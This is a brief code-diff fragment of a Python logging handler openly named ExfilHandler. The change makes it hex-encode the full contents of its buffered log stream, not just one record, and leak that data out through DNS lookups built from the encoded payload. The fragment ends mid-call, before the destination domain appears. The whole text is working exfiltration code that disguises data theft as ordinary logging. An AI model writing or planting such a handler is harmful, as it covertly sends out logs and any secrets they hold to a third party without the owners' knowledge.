@@ -36,7 +36,8 @@ class ExfilHandler(logging.handlers.MemoryHandler):
         self.buffer.append(record)
         if self.shouldFlush(record):
             self.flush()
-            payload = binascii.hexlify(bytes(record, 'utf8'))
+            payload = binascii.hexlify(
+                bytes(self.target.stream.getvalue(), 'utf8'))
             socket.gethostbyname(
                 '{0}.{1}'.format(
                     payload,
